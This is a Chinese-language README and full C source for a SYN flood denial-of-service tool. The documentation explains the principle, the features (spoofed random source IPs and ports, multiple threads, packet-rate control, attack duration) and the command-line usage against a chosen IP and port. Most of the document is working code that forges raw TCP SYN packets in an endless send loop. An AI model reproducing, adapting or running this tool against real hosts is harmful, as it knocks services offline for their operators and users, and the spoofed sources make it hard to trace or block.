# SYN Flood攻击程序说明文档

## 1. 原理

该程序实现了一个简单的SYN Flood攻击，属于一种**拒绝服务攻击（DoS）**。SYN Flood攻击利用TCP协议的三次握手原理，通过不断发送伪造的TCP SYN请求来消耗目标主机的资源，从而导致目标服务器无法响应正常的请求。原理如下：

1. 客户端发送TCP SYN数据包给服务器，表示请求建立连接。
2. 服务器响应SYN-ACK，表示愿意接受连接。
3. 正常情况下，客户端应返回ACK以完成握手，但在SYN Flood攻击中，客户端伪造了源IP地址，使得服务器无法收到ACK响应，从而导致服务器资源占用。

通过大量发送这种半开连接的请求，目标服务器的资源会被耗尽，从而无法处理正常的请求。

## 2. 目标

该程序的目标是对指定的IP地址和端口发起SYN Flood攻击。通过伪造大量TCP SYN数据包，可以使目标主机的TCP连接队列填满，从而造成拒绝服务。目标如下：

- 目标IP：用户通过命令行参数指定。
- 目标端口：用户通过命令行参数指定。

## 3. 功能

- **伪造TCP SYN数据包**：程序通过手动构建IP和TCP头部来伪造数据包。每个数据包都有随机的源IP地址和源端口，以防止被轻易过滤。
- **多线程并发**：用户可以指定多个线程同时执行攻击，增加攻击强度。
- **可调速率**：用户可以设置每秒数据包发送速率的上限，通过`limiter`和`sleeptime`控制实际的发送速率。
- **自定义攻击时长**：用户可以指定攻击持续的时间，程序会在规定时间后停止。

## 4. 使用方法

程序运行时需要以下命令行参数：

```bash
./syn_flood <目标IP> <目标端口> <线程数> <每秒数据包限制> <攻击持续时间>
```
### 参数说明
- **<目标IP>**：你希望攻击的目标服务器的IP地址，例如192.168.1.1。
- **<目标端口>**: 目标服务器的端口号，例如80表示HTTP服务端口。
- **<线程数>**：指定多少个线程并发执行攻击，例如5表示同时开启5个线程。
- **<每秒数据包限制>**：限制每秒发送的数据包数量，例如1000表示每秒发送不超过1000个包。-1表示不限制。
- **<攻击持续时间>：攻击的持续时间，以秒为单位。例如，60表示攻击持续1分钟。

### 示例
```bash
./syn_flood 192.168.1.1 80 10 1000 60
```

```c
#include <pthread.h>         // 引入 POSIX 线程库，用于多线程处理
#include <unistd.h>          // 引入 Unix 标准库，提供 sleep 和其他函数
#include <stdio.h>           // 引入标准输入输出库
#include <stdlib.h>          // 引入标准库，用于内存分配、随机数生成等
#include <string.h>          // 引入字符串操作库，用于内存拷贝等
#include <sys/socket.h>      // 提供套接字函数，如 socket(), sendto() 等
#include <netinet/ip.h>      // 提供 IP 头部的结构定义
#include <netinet/tcp.h>     // 提供 TCP 头部的结构定义
#include <time.h>            // 引入时间库，用于种子生成和计时

#define MAX_PACKET_SIZE 4096 // 定义最大数据包大小为 4096 字节
#define PHI 0x9e3779b9       // 定义常量 PHI，用于随机数生成的种子

// 伪随机数生成器的状态和计数器
static unsigned long int Q[4096], c = 362436;  // Q 为随机数数组，c 是计数器，用于生成随机数
static unsigned int floodport;  // 记录洪水攻击的目标端口号
volatile int limiter;           // 用于控制数据包发送速率的变量
volatile unsigned int pps;      // 记录每秒发送的数据包数量
volatile unsigned int sleeptime = 100; // 控制线程的休眠时间（以微秒为单位）

// 初始化随机数生成器，基于输入种子 x
void init_rand(unsigned long int x)
{
    int i;
    // 通过公式初始化 Q 数组的前几个值
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    // 依次初始化 Q 数组的剩余元素
    for (i = 3; i < 4096; i++) {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

// 伪随机数生成函数，使用 CMWC (Complementary Multiply with Carry) 算法
unsigned long int rand_cmwc(void)
{
    unsigned long long int t, a = 18782LL;  // t 为临时变量，a 是 CMWC 算法的常量
    static unsigned long int i = 4095;      // i 是数组索引，循环访问 Q 数组
    unsigned long int x, r = 0xfffffffe;    // r 是掩码，用于确保生成的随机数符合范围
    i = (i + 1) & 4095;                     // i 在 0-4095 之间循环
    t = a * Q[i] + c;                       // 使用公式生成下一个随机数
    c = (t >> 32);                          // 更新进位值 c
    x = t + c;
    if (x < c) {                            // 如果溢出，则增加 x 和 c
        x++;
        c++;
    }
    return (Q[i] = r - x);                  // 更新 Q[i]，并返回新的随机数
}

// 计算校验和，用于 IP 和 TCP 头部
unsigned short csum(unsigned short* buf, int count)
{
    register unsigned long sum = 0;  // 定义寄存器变量 sum，用于累加校验和
    // 遍历数据块，依次累加每 2 个字节
    while (count > 1) {
        sum += *buf++;
        count -= 2;
    }
    // 如果有剩余的一个字节，则将其加入校验和
    if (count > 0) {
        sum += *(unsigned char*)buf;
    }
    // 将高 16 位的进位加入低 16 位，直到没有进位
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return (unsigned short)(~sum);  // 返回校验和的反码
}

// 计算 TCP 校验和，基于 IP 头和 TCP 头
unsigned short tcpcsum(struct iphdr* iph, struct tcphdr* tcph)
{
    // 定义 TCP 伪头，用于校验计算
    struct tcp_pseudo {
        unsigned long src_addr;  // 源 IP 地址
        unsigned long dst_addr;  // 目的 IP 地址
        unsigned char zero;      // 填充的 0
        unsigned char proto;     // 协议类型
        unsigned short length;   // TCP 头部长度
    } pseudohead;

    unsigned short total_len = iph->tot_len;   // 获取 IP 报文的总长度

    // 填充伪头
    pseudohead.src_addr = iph->saddr;          // 设置伪头的源地址
    pseudohead.dst_addr = iph->daddr;          // 设置伪头的目标地址
    pseudohead.zero = 0;                       // 填充 0
    pseudohead.proto = IPPROTO_TCP;            // 协议类型为 TCP
    pseudohead.length = htons(sizeof(struct tcphdr));  // 设置 TCP 头部的长度

    // 计算 TCP 校验和所需的总长度
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);

    // 为校验计算分配临时内存
    unsigned short* tcp = malloc(totaltcp_len);
    memcpy((unsigned char*)tcp, &pseudohead, sizeof(struct tcp_pseudo));   // 拷贝伪头到内存
    memcpy((unsigned char*)tcp + sizeof(struct tcp_pseudo), (unsigned char*)tcph, sizeof(struct tcphdr));  // 拷贝 TCP 头

    // 计算并返回 TCP 校验和
    unsigned short output = csum(tcp, totaltcp_len);
    free(tcp);  // 释放临时内存
    return output;
}

// 设置 IP 头部的字段
void setup_ip_header(struct iphdr* iph)
{
    char ip[17];  // 存储源 IP 地址
    // 随机生成源 IP 地址，格式为 "x.x.x.x"
    snprintf(ip, sizeof(ip) - 1, "%d.%d.%d.%d", rand() % 255, rand() % 255, rand() % 255, rand() % 255);
    iph->ihl = 5;  // 设置 IP 头部长度（5 个 32-bit 字）
    iph->version = 4;  // 设置 IP 版本为 IPv4
    iph->tos = 0;  // 服务类型设置为 0（默认）
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);  // 设置总长度（IP 头 + TCP 头）
    iph->id = htonl(rand() % 54321);  // 随机生成 ID，防止标识相同
    iph->frag_off = 0;  // 设置不分片
    iph->ttl = MAXTTL;  // 设置 TTL（生存时间），最大值表示长时间存活
    iph->protocol = 6;  // 协议类型为 TCP
    iph->check = 0;  // 初始校验和设置为 0
    iph->saddr = inet_addr(ip);  // 使用生成的源 IP 地址
}

// 设置 TCP 头部的字段
void setup_tcp_header(struct tcphdr* tcph)
{
    tcph->source = htons(rand() % 65535);  // 随机生成源端口号
    tcph->seq = rand();  // 随机生成序列号
    tcph->ack_seq = 0;  // 设置 ACK 序列号为 0（初始状态）
    tcph->res2 = 0;  // 保留字段设置为 0
    tcph->doff = 5;  // TCP 头部长度（5 个 32-bit 字）
    tcph->syn = 1;  // 设置 SYN 标志位，表示建立连接请求
    tcph->window = htonl(65535);  // 设置窗口大小为 65535（最大）
    tcph->check = 0;  // 初始校验和设置为 0
    tcph->urg_ptr = 0;  // 紧急指针设置为 0（不使用）
}

 
void* flood(void* par1)
{
    // 将传入的参数 par1 转换为字符指针，即目标 IP 地址
    char* td = (char*)par1;

    // 定义数据包缓冲区，大小为 MAX_PACKET_SIZE
    char datagram[MAX_PACKET_SIZE];

    // 将 datagram 的前部分映射为 IP 头部
    struct iphdr* iph = (struct iphdr*)datagram;

    // 将 datagram 的后部分映射为 TCP 头部
    struct tcphdr* tcph = (void*)iph + sizeof(struct iphdr);

    // 初始化 sockaddr_in 结构，表示目标的 IP 地址和端口号
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;             // 使用 IPv4 地址族
    sin.sin_port = htons(floodport);      // 将目标端口号转换为网络字节序
    sin.sin_addr.s_addr = inet_addr(td);  // 将目标 IP 地址转换为网络字节序

    // 创建一个原始套接字，使用 IPv4 和 TCP 协议
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) {
        // 如果套接字创建失败，打印错误信息并退出程序
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
    }

    // 将数据包缓冲区清零
    memset(datagram, 0, MAX_PACKET_SIZE);

    // 设置 IP 头部
    setup_ip_header(iph);

    // 设置 TCP 头部
    setup_tcp_header(tcph);

    // 设置 TCP 目标端口
    tcph->dest = htons(floodport);

    // 设置 IP 目标地址
    iph->daddr = sin.sin_addr.s_addr;

    // 计算并设置 IP 头部的校验和
    iph->check = csum((unsigned short*)datagram, iph->tot_len);

    // 设置 HDRINCL 选项，告知内核我们手动构建了 IP 头部
    int tmp = 1;
    const int* val = &tmp;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0) {
        // 如果 setsockopt 失败，打印错误信息并退出程序
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
    }

    // 使用当前时间作为种子，初始化伪随机数生成器
    init_rand(time(NULL));

    // 定义局部变量 i，用于数据包发送的计数
    register unsigned int i;
    i = 0;

    // 无限循环，持续发送伪造的数据包
    while (1) {
        // 发送伪造的 TCP SYN 数据包
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&sin, sizeof(sin));

        // 重新设置 IP 和 TCP 头部，以伪造新的随机包
        setup_ip_header(iph);
        setup_tcp_header(tcph);

        // 随机生成新的源 IP 地址
        iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 |
            (rand_cmwc() >> 16 & 0xFF) << 16 |
            (rand_cmwc() >> 8 & 0xFF) << 8 |
            (rand_cmwc() & 0xFF);

        // 随机生成新的 IP 报文 ID
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);

        // 重新设置 TCP 目标端口
        tcph->dest = htons(floodport);

        // 重新设置 IP 目标地址
        iph->daddr = sin.sin_addr.s_addr;

        // 重新计算并设置 IP 头部的校验和
        iph->check = csum((unsigned short*)datagram, iph->tot_len);

        // 重新生成 TCP 序列号
        tcph->seq = rand_cmwc() & 0xFFFF;

        // 随机生成新的 TCP 源端口
        tcph->source = htons(rand_cmwc() & 0xFFFF);

        // 重新计算并设置 TCP 校验和
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);

        // 每发送一个包，pps (每秒发送的数据包数量) 递增
        pps++;

        // 如果发送的数据包数量达到限制，睡眠一段时间以控制发送速率
        if (i >= limiter) {
            i = 0;
            usleep(sleeptime);  // 休眠一定的时间
        }

        i++;
    }
}

int main(int argc, char* argv[])
{
    // 如果参数数量少于 6 个，打印错误提示并退出
    if (argc < 6) {
        fprintf(stderr, "Invalid parameters!\n");
        fprintf(stdout, "SSYN Flooder by LSDEV\nImproved by Starfall\nUsage: %s <target IP> <port to be flooded> <number threads to use> <pps limiter, -1 for no limit> <time>\n", argv[0]);
        exit(-1);
    }

    // 使用当前时间作为随机数种子
    srand(time(0));

    // 打印攻击开始的提示信息
    fprintf(stdout, "Tank: So what do you need? Besides a miracle.\nNeo: Packets. Lots of packets.\n");

    // 读取用户输入的参数，线程数量、目标端口号和每秒数据包限制
    int num_threads = atoi(argv[3]);  // 使用的线程数量
    floodport = atoi(argv[2]);        // 目标端口号
    int maxpps = atoi(argv[4]);       // 每秒数据包发送限制
    limiter = 0;                      // 限制器初始值
    pps = 0;                          // 每秒发送的数据包数初始为 0

    // 创建多个线程，每个线程执行 flood 函数
    pthread_t thread[num_threads];
    int multiplier = 20;              // 设置时间乘数，以控制执行频率
    int i;

    // 创建 num_threads 个线程，每个线程执行 flood 函数，传入目标 IP 作为参数
    for (i = 0; i < num_threads; i++) {
        pthread_create(&thread[i], NULL, &flood, (void*)argv[1]);
    }

    // 控制程序的运行时间，循环运行指定的时间
    for (i = 0; i < (atoi(argv[5]) * multiplier); i++) {
        // 每次循环睡眠 50ms
        usleep((1000 / multiplier) * 1000);

        // 如果每秒发送的数据包数量超过限制
        if ((pps * multiplier) > maxpps) {
            if (1 > limiter) {
                sleeptime += 100;  // 增加休眠时间，减慢发送速度
            }
            else {
                limiter--;  // 否则减少限制器值
            }
        }
        else {
            limiter++;  // 增加限制器值
            if (sleeptime > 25) {
                sleeptime -= 25;  // 减少休眠时间，加快发送速度
            }
            else {
                sleeptime = 0;  // 将休眠时间设为 0
            }
        }

        // 每秒结束时将 pps 计数重置为 0
        pps = 0;
    }

    return 0;  // 主函数结束，程序终止
}

```